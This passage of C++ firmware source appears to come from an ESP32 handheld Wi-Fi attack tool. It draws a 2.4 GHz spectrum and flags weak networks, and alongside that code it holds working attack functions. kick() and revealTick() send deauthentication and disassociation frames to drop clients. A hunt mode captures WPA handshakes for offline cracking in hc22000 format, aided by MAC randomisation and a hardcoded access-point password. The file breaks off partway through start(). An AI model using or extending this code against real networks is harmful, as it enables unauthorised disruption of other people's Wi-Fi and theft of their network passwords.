// Rewritten 2.4 GHz spectrum for 0N3P0rK.
// Look: OnePork lobes / grass / waterfall. Guts: our radio, no NetworkRecon.
#include "spectrum.h"
#include "../ui/display.h"
#include "../ui/keys.h"
#include "../cap/sniffer.h"
#include "../cap/hc22000.h"
#include "../core/wsl_bypasser.h"
#include "../core/config.h"
#include "../piglet/avatar.h"
#include "../audio/sfx.h"
#include "../core/app.h"
#include <M5Cardputer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>

namespace SpectrumMode {

static const int L = 20;
static const int R = 236;
static const int W = R - L;
static const int TOP = 2;
static const int BOT = 46;
static const int WF_TOP = 48;
static const int WF_ROWS = 12;
static const int CH_Y = 62;
static const int INFO_Y = 72;
static const int LIST_Y = 82;
static const uint32_t BAR_FLIP_MS = 2200;

static const int8_t RSSI_MIN = -95;
static const int8_t RSSI_MAX = -30;
static const int8_t NOISE = -92;

static const float CENTER0 = 2442.0f;
static const float WIDTH0 = 72.0f;

static const uint8_t MAX_NETS = 24;
static const uint8_t MAX_CLI = 8;
static const uint8_t VIS_CLI = 5;
static const uint32_t STALE_NET = 12000;
static const uint32_t STALE_CLI = 25000;
static const uint8_t HOP[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t HOP_N = 13;
static const uint16_t HOP_MS = 220;

enum Auth : uint8_t { A_OPEN = 0, A_WEP, A_WPA, A_WPA2, A_WPA3, A_MIX };
enum Filt : uint8_t { F_ALL = 0, F_VULN, F_SOFT, F_HIDDEN };
enum Phase : uint8_t { SWEEP = 0, LOCK, HUNT };

struct Client {
    uint8_t mac[6];
    int8_t rssi;
    uint32_t lastSeen;
    uint16_t pkts;
};

struct Net {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t ch;
    int8_t rssi;
    uint32_t lastSeen;
    Auth auth;
    bool pmf;
    bool hidden;
    float freq;
    Client cli[MAX_CLI];
    uint8_t nCli;
};

static const float SINC[45] = {
    0.00f, 0.07f, 0.11f, 0.13f, 0.11f,
    0.07f, 0.00f, 0.09f, 0.15f, 0.18f,
    0.15f, 0.00f, 0.17f, 0.27f, 0.33f,
    0.37f, 0.50f, 0.65f, 0.80f, 0.91f,
    0.97f, 1.00f, 1.00f,
    1.00f, 0.97f, 0.91f, 0.80f, 0.65f,
    0.50f, 0.37f, 0.33f, 0.27f, 0.17f,
    0.00f, 0.15f, 0.18f, 0.15f, 0.09f,
    0.00f, 0.07f, 0.11f, 0.13f, 0.11f,
    0.07f, 0.00f
};

static bool s_run = false;
static volatile bool s_busy = false;
static Phase s_phase = SWEEP;
static Filt s_filt = F_ALL;
static Net s_net[MAX_NETS];
static uint8_t s_nNet = 0;
static int8_t s_sel = -1;
static uint8_t s_selMac[6];
static bool s_hasSel = false;
static float s_center = CENTER0;
static uint8_t s_hopI = 0;
static uint8_t s_ch = 6;
static uint32_t s_lastHop = 0;
static uint32_t s_lastPrune = 0;
static bool s_keyWas = false;
static uint8_t s_monBssid[6];
static uint8_t s_monCh = 6;
// Spectrum-local HS depth (seeds from RADIO on start). D cycles in LOCK/HUNT.
// 0 = PAIR (M1+M2), 1 = +M3, 2 = FULL (M1-M4).
static uint8_t s_huntDepth = 0;

static const char* huntDepthName(uint8_t d) {
    if (d == 1) return "+M3";
    if (d >= 2) return "FULL";
    return "PAIR";
}

static void applyHuntDepth() {
    if (s_huntDepth > 2) s_huntDepth = 2;
    Cap::setHsDepth(s_huntDepth);
}

static void cycleHuntDepth() {
    s_huntDepth = (uint8_t)((s_huntDepth + 1) % 3);
    applyHuntDepth();
    char msg[20];
    snprintf(msg, sizeof(msg), "HS %s", huntDepthName(s_huntDepth));
    Display::showToast(msg, 900);
    SFX::play(SFX::MENU_CLICK);
}

static int8_t s_cliSel = 0;
static uint8_t s_cliScroll = 0;
static bool s_reveal = false;
static uint32_t s_revealT0 = 0;
static uint32_t s_revealBurst = 0;
static volatile uint32_t s_pktN = 0;
static uint32_t s_pps = 0;
static uint32_t s_ppsT0 = 0;
static volatile bool s_beepCli = false;
static uint8_t s_apMac[6];

static int8_t s_col[W];
static int8_t s_persist[W];
static int8_t s_peak[W];
static uint8_t s_wf[WF_ROWS][W];
static uint8_t s_wfRow = 0;
static uint32_t s_wfT0 = 0;
static uint16_t s_noise = 0xACE1;
static uint16_t s_chRate[14];
static uint32_t s_chHit[14];
static uint32_t s_chSnap[14];
static uint32_t s_rateT0 = 0;

static uint8_t noise7() {
    s_noise ^= (uint16_t)(s_noise << 7);
    s_noise ^= (uint16_t)(s_noise >> 9);
    s_noise ^= (uint16_t)(s_noise << 8);
    return (uint8_t)(s_noise & 7);
}

static bool macEq(const uint8_t* a, const uint8_t* b) { return memcmp(a, b, 6) == 0; }
static bool macMcast(const uint8_t* m) { return (m[0] & 1) != 0; }
static bool macZero(const uint8_t* m) {
    return !(m[0] | m[1] | m[2] | m[3] | m[4] | m[5]);
}

static float chToFreq(uint8_t ch) {
    if (ch < 1) ch = 1;
    if (ch > 13) ch = 13;
    return 2412.0f + (float)(ch - 1) * 5.0f;
}

static int freqToX(float f) {
    float left = s_center - WIDTH0 * 0.5f;
    float t = (f - left) / WIDTH0;
    return L + (int)(t * (float)W);
}

static int rssiToY(int8_t rssi) {
    if (rssi < RSSI_MIN) rssi = RSSI_MIN;
    if (rssi > RSSI_MAX) rssi = RSSI_MAX;
    float t = (float)(rssi - RSSI_MIN) / (float)(RSSI_MAX - RSSI_MIN);
    int y = BOT - (int)(t * (float)(BOT - TOP));
    if (y < TOP) y = TOP;
    if (y > BOT) y = BOT;
    return y;
}

static float sincAmp(float dist) {
    float p = dist + 22.0f;
    if (p < 0 || p > 44.0f) return 0;
    int i = (int)p;
    float f = p - (float)i;
    if (i >= 44) return SINC[44];
    return SINC[i] + f * (SINC[i + 1] - SINC[i]);
}

static bool vuln(Auth a) { return a == A_OPEN || a == A_WEP || a == A_WPA; }

static const char* authStr(Auth a) {
    switch (a) {
        case A_OPEN: return "OPEN";
        case A_WEP:  return "WEP";
        case A_WPA:  return "WPA";
        case A_WPA2: return "WPA2";
        case A_WPA3: return "WPA3";
        default:     return "MIX";
    }
}

static bool passFilt(const Net& n) {
    switch (s_filt) {
        case F_VULN:   return vuln(n.auth);
        case F_SOFT:   return !n.pmf;
        case F_HIDDEN: return n.hidden;
        default:       return true;
    }
}

static int findNet(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_nNet; i++)
        if (macEq(s_net[i].bssid, bssid)) return (int)i;
    return -1;
}

static void setSel(int i) {
    if (i < 0 || i >= (int)s_nNet) {
        s_sel = -1;
        s_hasSel = false;
        return;
    }
    s_sel = (int8_t)i;
    memcpy(s_selMac, s_net[i].bssid, 6);
    s_hasSel = true;
}

static void syncSel() {
    if (!s_hasSel) {
        s_sel = -1;
        return;
    }
    s_sel = (int8_t)findNet(s_selMac);
}

static bool netHeld(int i) {
    if (i < 0 || i >= (int)s_nNet) return false;
    if (s_hasSel && macEq(s_net[i].bssid, s_selMac)) return true;
    if (s_phase != SWEEP && macEq(s_net[i].bssid, s_monBssid)) return true;
    return false;
}

static int nextSel(int dir) {
    if (s_nNet == 0) return -1;
    int start = s_sel < 0 ? 0 : s_sel;
    for (uint8_t k = 0; k < s_nNet; k++) {
        int i = start + dir * ((int)k + 1);
        while (i < 0) i += s_nNet;
        while (i >= s_nNet) i -= s_nNet;
        if (passFilt(s_net[i])) return i;
    }
    return s_sel;
}

static void parseAuth(const uint8_t* p, uint16_t len, Auth& auth, bool& pmf) {
    auth = A_OPEN;
    pmf = false;
    bool rsn = false, wpa = false, mfpr = false;
    uint16_t o = 36;
    while (o + 2 < len) {
        uint8_t t = p[o], n = p[o + 1];
        if (o + 2 + n > len) break;
        if (t == 0x30 && n >= 2) {
            rsn = true;
            // 32-bit offset/end on purpose: pc/ac are attacker-controlled
            // (straight from a radio frame) and pc*4 can reach ~262KB.
            // The old uint16_t q/end truncated that back into 16 bits on
            // `q += 2 + pc*4`, so a crafted/corrupt beacon could wrap q to
            // some unrelated small value that still passed the `q+2<=end`
            // check, making p[q]/p[q+1] an out-of-bounds read past this
            // IE (and potentially past the packet buffer). uint32_t just
            // can't wrap at these magnitudes, so it can't happen here.
            uint32_t q = (uint32_t)o + 8;
            uint32_t end = (uint32_t)o + 2 + n;
            if (q + 2 <= end) {
                uint16_t pc = p[q] | ((uint16_t)p[q + 1] << 8);
                q += 2 + (uint32_t)pc * 4;
                if (q + 2 <= end) {
                    uint16_t ac = p[q] | ((uint16_t)p[q + 1] << 8);
                    q += 2 + (uint32_t)ac * 4;
                    if (q + 2 <= end) {
                        uint16_t cap = p[q] | ((uint16_t)p[q + 1] << 8);
                        if (cap & 0x0080) pmf = true;
                        if (cap & 0x0040) { pmf = true; mfpr = true; }
                    }
                }
            }
        } else if (t == 0xDD && n >= 8 &&
                   p[o + 2] == 0x00 && p[o + 3] == 0x50 &&
                   p[o + 4] == 0xF2 && p[o + 5] == 0x01) {
            wpa = true;
        }
        o = (uint16_t)(o + 2 + n);
    }
    if (rsn && mfpr) auth = A_WPA3;
    else if (rsn && wpa) auth = A_MIX;
    else if (rsn) auth = A_WPA2;
    else if (wpa) auth = A_WPA;
}

static void onBeacon(const uint8_t* bssid, uint8_t rxCh, uint8_t ds, int8_t rssi,
                     const char* ssid, Auth auth, bool pmf, bool probe) {
    (void)probe; // kept in the signature for call-site symmetry with onRx(); unused here
    if (s_busy) return;
    int idx = findNet(bssid);
    if (idx < 0) {
        if (s_nNet >= MAX_NETS) {
            int worst = -1;
            for (uint8_t i = 0; i < s_nNet; i++) {
                if (netHeld((int)i)) continue;
                if (worst < 0 || s_net[i].rssi < s_net[worst].rssi) worst = (int)i;
            }
            if (worst < 0) return;
            idx = worst;
            memset(&s_net[idx], 0, sizeof(Net));
            memcpy(s_net[idx].bssid, bssid, 6);
        } else {
            idx = (int)s_nNet++;
            memset(&s_net[idx], 0, sizeof(Net));
            memcpy(s_net[idx].bssid, bssid, 6);
        }
    }
    Net& n = s_net[idx];
    if (ds >= 1 && ds <= 13) n.ch = ds;
    else if (n.ch < 1 || n.ch > 13) {
        if (rxCh >= 1 && rxCh <= 13) n.ch = rxCh;
        else return;
    }
    n.rssi = rssi;
    n.lastSeen = millis();
    n.auth = auth;
    n.pmf = pmf;
    n.freq = chToFreq(n.ch);
    if (!s_hasSel && passFilt(n)) setSel(idx);
    if (ssid && ssid[0]) {
        strncpy(n.ssid, ssid, 32);
        n.ssid[32] = 0;
        n.hidden = false;
    } else if (!n.ssid[0]) {
        n.hidden = true;
    }
}

static void trackCli(const uint8_t* bssid, const uint8_t* mac, int8_t rssi) {
    if (s_busy || !mac || macMcast(mac) || macZero(mac)) return;
    if (macEq(mac, bssid) || macEq(mac, s_apMac)) return;
    int idx = findNet(bssid);
    if (idx < 0) return;
    Net& n = s_net[idx];
    int c = -1;
    for (uint8_t i = 0; i < n.nCli; i++)
        if (macEq(n.cli[i].mac, mac)) { c = (int)i; break; }
    if (c < 0) {
        if (n.nCli >= MAX_CLI) return;
        c = (int)n.nCli++;
        memset(&n.cli[c], 0, sizeof(Client));
        memcpy(n.cli[c].mac, mac, 6);
        s_beepCli = true;
    }
    n.cli[c].rssi = rssi;
    n.cli[c].lastSeen = millis();
    if (n.cli[c].pkts < 60000) n.cli[c].pkts++;
}

static void onData(const uint8_t* p, uint16_t len, int8_t rssi) {
    if (len < 24 || s_phase != LOCK) return;
    uint16_t fc = p[0] | ((uint16_t)p[1] << 8);
    bool toDs = fc & 0x0100;
    bool fromDs = fc & 0x0200;
    const uint8_t* a1 = p + 4;
    const uint8_t* a2 = p + 10;
    const uint8_t* a3 = p + 16;
    if (toDs && !fromDs) trackCli(a1, a2, rssi);
    else if (!toDs && fromDs) trackCli(a2, a1, rssi);
    else if (!toDs && !fromDs) {
        if (macEq(a3, s_monBssid)) trackCli(a3, a2, rssi);
    }
}

static void onRx(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_run || s_busy) return;
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (!pkt || !pkt->payload) return;
    s_pktN++;
    uint8_t ch = pkt->rx_ctrl.channel;
    if (ch >= 1 && ch <= 13) s_chHit[ch]++;
    const uint8_t* p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    if (type == WIFI_PKT_DATA) {
        onData(p, len, rssi);
        return;
    }
    if (type != WIFI_PKT_MGMT || len < 36) return;
    uint8_t ft = p[0];
    if (ft != 0x80 && ft != 0x50) return;
    const uint8_t* bssid = p + 16;
    char ssid[33] = {0};
    uint8_t ds = 0;
    uint16_t o = 36;
    while (o + 2 < len) {
        uint8_t t = p[o], n = p[o + 1];
        if (o + 2 + n > len) break;
        if (t == 0 && n <= 32) {
            memcpy(ssid, p + o + 2, n);
            ssid[n] = 0;
        } else if (t == 3 && n == 1) {
            ds = p[o + 2];
        }
        o = (uint16_t)(o + 2 + n);
    }
    Auth auth;
    bool pmf;
    parseAuth(p, len, auth, pmf);
    onBeacon(bssid, ch, ds, rssi, ssid, auth, pmf, ft == 0x50);
}

static void radioOn() {
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP_STA);
    WiFi.setSleep(false);
    if (Config::radio().randomMac) WSLBypasser::randomizeMAC();
    WiFi.softAP("0N3SPEC", "onelpig123", 6, 1, 4);
    delay(80);
    WiFi.softAPmacAddress(s_apMac);
    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&onRx);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    s_ch = 6;
}

static void radioOff() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
}

static void hopTick() {
    if (s_phase != SWEEP) return;
    uint32_t now = millis();
    if (now - s_lastHop < HOP_MS) return;
    s_lastHop = now;
    s_hopI = (uint8_t)((s_hopI + 1) % HOP_N);
    s_ch = HOP[s_hopI];
    esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
}

static void prune() {
    uint32_t now = millis();
    if (now - s_lastPrune < 800) return;
    s_lastPrune = now;
    s_busy = true;
    for (int i = (int)s_nNet - 1; i >= 0; i--) {
        if (netHeld(i)) continue;
        if (now - s_net[i].lastSeen > STALE_NET) {
            s_net[i] = s_net[s_nNet - 1];
            s_nNet--;
        }
    }
    syncSel();
    if (s_phase == LOCK) {
        int idx = findNet(s_monBssid);
        if (idx >= 0) {
            Net& n = s_net[idx];
            for (int i = (int)n.nCli - 1; i >= 0; i--) {
                if (now - n.cli[i].lastSeen > STALE_CLI) {
                    n.cli[i] = n.cli[n.nCli - 1];
                    n.nCli--;
                }
            }
            if (s_cliSel >= n.nCli) s_cliSel = n.nCli ? (int8_t)(n.nCli - 1) : 0;
        }
    }
    s_busy = false;
}

static void enterLock() {
    if (s_sel < 0 || s_sel >= s_nNet) return;
    s_busy = true;
    memcpy(s_monBssid, s_net[s_sel].bssid, 6);
    s_monCh = s_net[s_sel].ch;
    setSel(s_sel);
    s_net[s_sel].nCli = 0;
    s_cliSel = 0;
    s_cliScroll = 0;
    s_reveal = false;
    s_phase = LOCK;
    esp_wifi_set_channel(s_monCh, WIFI_SECOND_CHAN_NONE);
    s_ch = s_monCh;
    s_busy = false;
    SFX::play(SFX::CHANNEL_LOCK);
    Avatar::setState(AvatarState::HUNTING);
    Display::showToast(s_net[s_sel].ssid[0] ? s_net[s_sel].ssid : "HIDDEN");
}

static void exitLock() {
    s_busy = true;
    s_reveal = false;
    s_phase = SWEEP;
    memset(s_monBssid, 0, 6);
    s_busy = false;
}

static void enterHunt() {
    if (s_phase == SWEEP) {
        if (s_sel < 0 || s_sel >= s_nNet) {
            Display::showToast("PICK A NET");
            return;
        }
        memcpy(s_monBssid, s_net[s_sel].bssid, 6);
        s_monCh = s_net[s_sel].ch;
        setSel(s_sel);
    }
    int idx = findNet(s_monBssid);
    if (idx < 0) {
        Display::showToast("NO TARGET");
        return;
    }
    const Net& n = s_net[idx];
    s_reveal = false;
    radioOff();
    Cap::startPinned(n.ch, n.bssid, n.ssid);
    applyHuntDepth(); // after start so Cap picks spectrum depth, not stale RADIO
    s_phase = HUNT;
    SFX::play(SFX::CHANNEL_LOCK);
    char toast[28];
    snprintf(toast, sizeof(toast), "%s %s",
             n.ssid[0] ? n.ssid : "HUNT", huntDepthName(s_huntDepth));
    Display::showToast(toast);
}

static void exitHunt() {
    if (Cap::isRunning()) Cap::stop();
    s_phase = LOCK;
    radioOn();
    esp_wifi_set_channel(s_monCh, WIFI_SECOND_CHAN_NONE);
    s_ch = s_monCh;
}

static void kick(int ci) {
    int idx = findNet(s_monBssid);
    if (idx < 0) return;
    Net& n = s_net[idx];
    if (n.pmf) {
        Display::showToast("PMF — WON'T DROP");
        return;
    }
    uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    const uint8_t* sta = (ci >= 0 && ci < n.nCli) ? n.cli[ci].mac : bc;
    s_busy = true;
    for (int i = 0; i < 6; i++) {
        WSLBypasser::sendDeauthFrame(n.bssid, n.ch, sta, 7);
        delay(2);
        WSLBypasser::sendDisassocFrame(n.bssid, n.ch, sta, 8);
        delay(2);
        if (ci >= 0 && ci < n.nCli) {
            WSLBypasser::sendDeauthFrame(sta, n.ch, n.bssid, 8);
            delay(2);
        }
    }
    s_busy = false;
    SFX::play(SFX::DEAUTH);
    Avatar::waveRipple(WaveMode::OUTGOING, 4);
    if (ci >= 0 && ci < n.nCli) {
        char m[24];
        snprintf(m, sizeof(m), "KICK %02X:%02X:%02X", sta[3], sta[4], sta[5]);
        Display::showToast(m);
    } else {
        Display::showToast("KICK ALL");
    }
}

static void revealTick() {
    if (!s_reveal) return;
    uint32_t now = millis();
    if (now - s_revealT0 > 8000) {
        s_reveal = false;
        int idx = findNet(s_monBssid);
        char m[24];
        snprintf(m, sizeof(m), "FOUND %u", idx >= 0 ? s_net[idx].nCli : 0);
        Display::showToast(m);
        return;
    }
    if (now - s_revealBurst < 420) return;
    s_revealBurst = now;
    int idx = findNet(s_monBssid);
    if (idx < 0 || s_net[idx].pmf) return;
    uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    WSLBypasser::sendDeauthFrame(s_net[idx].bssid, s_net[idx].ch, bc, 7);
}

static void updateBuf() {
    for (int i = 0; i < W; i++)
        s_col[i] = (int8_t)(NOISE + (int)(noise7() % 4) - 2);
    float leftF = s_center - WIDTH0 * 0.5f;
    float px = WIDTH0 / (float)W;
    for (uint8_t i = 0; i < s_nNet; i++) {
        if (!passFilt(s_net[i])) continue;
        float c = s_net[i].freq;
        for (int x = 0; x < W; x++) {
            float f = leftF + (float)x * px;
            float amp = sincAmp(f - c);
            if (amp < 0.05f) continue;
            int8_t v = (int8_t)(NOISE + (int)((s_net[i].rssi - NOISE) * amp));
            if (v > s_col[x]) s_col[x] = v;
        }
    }
    for (int i = 0; i < W; i++) {
        s_persist[i] = (int8_t)((s_persist[i] * 3 + s_col[i]) / 4);
        if (s_col[i] > s_peak[i]) s_peak[i] = s_col[i];
        else if (s_peak[i] > RSSI_MIN) s_peak[i]--;
    }
    uint32_t now = millis();
    if (now - s_wfT0 >= 100) {
        s_wfT0 = now;
        for (int x = 0; x < W; x++) {
            int in = (int)(s_persist[x] - RSSI_MIN) * 255 / (RSSI_MAX - RSSI_MIN);
            if (in < 0) in = 0;
            if (in > 255) in = 255;
            s_wf[s_wfRow][x] = (uint8_t)in;
        }
        s_wfRow = (uint8_t)((s_wfRow + 1) % WF_ROWS);
    }
    if (now - s_rateT0 >= 1000) {
        s_rateT0 = now;
        for (uint8_t c = 1; c <= 13; c++) {
            uint32_t hit = s_chHit[c];
            s_chRate[c] = (uint16_t)(hit - s_chSnap[c]);
            s_chSnap[c] = hit;
        }
        s_pps = s_pktN;
        s_pktN = 0;
    }
}

static void drawLobe(M5Canvas& c, float freq, int8_t rssi, bool filled, uint16_t act, uint16_t fg) {
    int peakY = rssiToY(rssi);
    int h = BOT - peakY;
    if (h <= 0) return;
    int lx = freqToX(freq - 22.0f);
    int rx = freqToX(freq + 22.0f);
    if (rx < L || lx > R) return;
    if (lx < L) lx = L;
    if (rx > R) rx = R;
    float leftF = s_center - WIDTH0 * 0.5f;
    (void)act;
    int prevY = BOT;
    for (int x = lx; x <= rx; x++) {
        float f = leftF + (float)(x - L) * WIDTH0 / (float)W;
        float amp = sincAmp(f - freq);
        int y = BOT - (int)(h * amp);
        if (y < TOP) y = TOP;
        if (y > BOT) y = BOT;
        if (filled) {
            if (y < BOT) c.drawFastVLine(x, y, BOT - y, fg);
        } else if (x > lx) {
            c.drawLine(x - 1, prevY, x, y, fg);
        }
        prevY = y;
    }
}

static void upName(const char* in, char* out, size_t n) {
    size_t i = 0;
    if (!in || !in[0]) {
        strncpy(out, "<HIDDEN>", n);
        out[n - 1] = 0;
        return;
    }
    while (in[i] && i + 1 < n) {
        char ch = in[i];
        if (ch >= 'a' && ch <= 'z') ch = (char)(ch - 32);
        out[i++] = ch;
    }
    out[i] = 0;
}

static void drawSweep(M5Canvas& c, uint16_t fg, uint16_t bg) {
    c.setTextWrap(false);
    c.drawFastVLine(L - 2, TOP, BOT - TOP, fg);
    c.setTextSize(1);
    c.setTextColor(fg);
    c.setTextDatum(middle_right);
    for (int8_t db = -30; db >= -90; db -= 20) {
        int y = rssiToY(db);
        c.drawFastHLine(L - 4, y, 3, fg);
        char lb[6];
        snprintf(lb, sizeof(lb), "%d", db);
        c.drawString(lb, L - 5, y < 6 ? 6 : y);
    }
    c.drawFastHLine(L, BOT, R - L, fg);

    for (int x = L; x < R; x++) {
        uint8_t n = noise7();
        int up = n / 3;
        if (up) c.drawFastVLine(x, BOT - up, up, fg);
    }

    for (uint8_t i = 0; i < s_nNet; i++) {
        if (!passFilt(s_net[i])) continue;
        bool sel = (i == (uint8_t)s_sel);
        uint16_t act = (s_net[i].ch <= 13) ? s_chRate[s_net[i].ch] : 0;
        drawLobe(c, s_net[i].freq, s_net[i].rssi, sel, act, fg);
    }

    c.drawFastHLine(L, WF_TOP - 1, W, fg);
    for (int row = 0; row < WF_ROWS; row++) {
        int br = (s_wfRow + row) % WF_ROWS;
        int y = WF_TOP + row;
        for (int x = 0; x < W; x++) {
            uint8_t in = s_wf[br][x];
            if (in <= 20) continue;
            bool pix = false;
            if (in > 200) pix = true;
            else if (in > 150) pix = ((x + row) & 1) == 0;
            else if (in > 100) pix = ((x & 1) == 0) && ((row & 1) == 0);
            else if (in > 50) pix = ((x % 3) == 0) && ((row & 1) == 0);
            else pix = ((x % 4) == 0) && ((row % 3) == 0);
            if (pix) c.drawPixel(L + x, y, fg);
        }
    }

    c.setTextDatum(top_center);
    c.setTextColor(fg);
    for (uint8_t ch = 1; ch <= 13; ch++) {
        int x = freqToX(chToFreq(ch));
        if (x < L || x > R) continue;
        bool hop = (ch == s_ch);
        c.drawFastVLine(x, BOT, 3, fg);
        if (hop) c.fillRect(x - 5, CH_Y - 1, 11, 9, fg);
        char lb[4];
        snprintf(lb, sizeof(lb), "%u", ch);
        c.setTextColor(hop ? bg : fg);
        c.drawString(lb, x, CH_Y);
        c.setTextColor(fg);
    }

    uint8_t tot = 0;
    for (uint8_t i = 0; i < s_nNet; i++) if (passFilt(s_net[i])) tot++;
    const char* fn = "ALL";
    if (s_filt == F_VULN) fn = "VULN";
    else if (s_filt == F_SOFT) fn = "SOFT";
    else if (s_filt == F_HIDDEN) fn = "HID";
    char info[40];
    snprintf(info, sizeof(info), "[F] %s  %u AP  %upps  CH%u",
             fn, tot, (unsigned)s_pps, s_ch);
    c.setTextDatum(top_left);
    c.setTextColor(UiStyle::GOLD);
    c.drawString(info, 2, INFO_Y);

    uint8_t shown = 0;
    int y = LIST_Y;
    if (s_sel >= 0 && s_sel < s_nNet && passFilt(s_net[s_sel])) {
        const Net& n = s_net[s_sel];
        char name[14];
        upName(n.ssid, name, sizeof(name));
        char line[40];
        snprintf(line, sizeof(line), "> %s  CH%u %s %+d",
                 name, n.ch, authStr(n.auth), n.rssi);
        c.setTextColor(UiStyle::PINK);
        c.drawString(line, 2, y);
        shown++;
        y += 9;
    }
    for (uint8_t i = 0; i < s_nNet && shown < 2; i++) {
        if (!passFilt(s_net[i])) continue;
        if ((int)i == s_sel) continue;
        char name[14];
        upName(s_net[i].ssid, name, sizeof(name));
        char line[40];
        snprintf(line, sizeof(line), "  %s  CH%u %+d", name, s_net[i].ch, s_net[i].rssi);
        c.setTextColor(fg);
        c.drawString(line, 2, y);
        shown++;
        y += 9;
    }
    if (!shown) {
        c.setTextColor(UiStyle::DIM);
        c.drawString("scanning 1-13...", 2, LIST_Y);
    }
}

static void drawLock(M5Canvas& c, uint16_t fg, uint16_t bg) {
    c.setTextWrap(false);
    int idx = findNet(s_monBssid);
    c.setTextSize(1);
    c.setTextDatum(top_left);
    if (idx < 0) {
        c.setTextColor(UiStyle::GOLD);
        c.drawString("NETWORK LOST", 4, 8);
        return;
    }
    const Net& n = s_net[idx];
    char name[16];
    upName(n.ssid, name, sizeof(name));
    char head[40];
    snprintf(head, sizeof(head), "LOCK  %s", name);
    c.setTextColor(UiStyle::GOLD);
    c.drawString(head, 4, 2);
    char meta[44];
    snprintf(meta, sizeof(meta), "CH%u %s  HS %s  %u STA%s",
             n.ch, authStr(n.auth), huntDepthName(s_huntDepth), n.nCli,
             n.pmf ? " PMF" : "");
    c.setTextColor(fg);
    c.drawString(meta, 4, 14);

    if (n.nCli == 0) {
        c.setTextColor(UiStyle::DIM);
        c.drawString("no clients yet", 4, 36);
    } else {
        const int lh = 12;
        uint8_t vis = 4;
        if (s_cliSel < s_cliScroll) s_cliScroll = (uint8_t)s_cliSel;
        if (s_cliSel >= s_cliScroll + vis)
            s_cliScroll = (uint8_t)(s_cliSel - vis + 1);
        for (uint8_t i = 0; i < vis; i++) {
            int ci = s_cliScroll + i;
            if (ci >= n.nCli) break;
            const Client& cl = n.cli[ci];
            int y = 28 + i * lh;
            if (ci == s_cliSel) {
                c.fillRect(2, y - 1, 236, lh, UiStyle::PINK);
                c.setTextColor(bg);
            } else {
                c.setTextColor(fg);
            }
            char line[36];
            snprintf(line, sizeof(line), "%u  %02X:%02X:%02X  %+ddB  %u",
                     (unsigned)(ci + 1),
                     cl.mac[3], cl.mac[4], cl.mac[5],
                     cl.rssi, (unsigned)cl.pkts);
            c.drawString(line, 6, y);
        }
    }

    if (s_reveal) {
        c.setTextColor(UiStyle::GOLD);
        c.drawString("WAKING CLIENTS...", 4, 80);
    }
}

static void drawHunt(M5Canvas& c, uint16_t fg, uint16_t bg) {
    (void)bg;
    c.setTextWrap(false);
    int idx = findNet(s_monBssid);
    const Cap::Counters& cap = Cap::counters();
    c.setTextSize(1);
    c.setTextDatum(top_left);

    char name[16];
    upName((idx >= 0 && s_net[idx].ssid[0]) ? s_net[idx].ssid : "HIDDEN", name, sizeof(name));
    char head[36];
    snprintf(head, sizeof(head), "HUNT  %s", name);
    c.setTextColor(UiStyle::GOLD);
    c.drawString(head, 4, 2);

    char line[40];
    snprintf(line, sizeof(line), "CH%u  %s  %s",
             s_monCh,
             idx >= 0 ? authStr(s_net[idx].auth) : "?",
             cap.methodTag[0] ? cap.methodTag : "OURS");
    c.setTextColor(fg);
    c.drawString(line, 4, 14);

    snprintf(line, sizeof(line), "kick %u   eapol %u",
             (unsigned)cap.framesDeauth, (unsigned)cap.framesEapol);
    c.setTextColor(UiStyle::PINK);
    c.drawString(line, 4, 28);

    snprintf(line, sizeof(line), "write %u   files %u",
             (unsigned)cap.framesWritten, (unsigned)cap.filesOpened);
    c.setTextColor(fg);
    c.drawString(line, 4, 40);

    bool pair = Hc22000::hasHandshake(s_monBssid, s_huntDepth);
    uint8_t mask = Hc22000::handshakeMask(s_monBssid);
    c.setTextColor(pair ? UiStyle::GOLD : UiStyle::DIM);
    // Progress toward selected depth (D cycles PAIR / +M3 / FULL).
    char pairLine[40];
    snprintf(pairLine, sizeof(pairLine), "%s%s%s%s need %s %s",
             (mask & 0x01) ? "M1" : "--",
             (mask & 0x02) ? "+M2" : "---",
             (mask & 0x04) ? "+M3" : "---",
             (mask & 0x08) ? "+M4" : "---",
             huntDepthName(s_huntDepth),
             pair ? "OK" : "…");
    c.drawString(pairLine, 4, 54);

    if (cap.lastHsSsid[0]) {
        char got[36];
        snprintf(got, sizeof(got), "GOT  %s", cap.lastHsSsid);
        c.setTextColor(UiStyle::GOLD);
        c.drawString(got, 4, 66);
    }

    c.setTextColor(UiStyle::CYAN);
    const char* st = "listening";
    if (Cap::isLocked()) st = "hold after M1";
    else if (cap.framesDeauth) st = "kicking + sniff";
    c.drawString(st, 4, 80);
}

void start() {
    if (s_run) return;
    if (Cap::isRunning()) Cap::stop();
    Avatar::suspendScene();
    Avatar::setState(AvatarState::HUNTING);
    memset(s_net, 0, sizeof(s_net));
    s_nNet = 0;
    s_sel = -1;
    s_hasSel = false;
    s_phase = SWEEP;
    s_filt = F_ALL;
    s_center = CENTER0;
    s_reveal = false;
    s_busy = false;
    memset(s_col, RSSI_MIN, sizeof(s_col));
    memset(s_persist, RSSI_MIN, sizeof(s_persist));
    memset(s_peak, RSSI_MIN, sizeof(s_peak));
    memset(s_wf, 0, sizeof(s_wf));
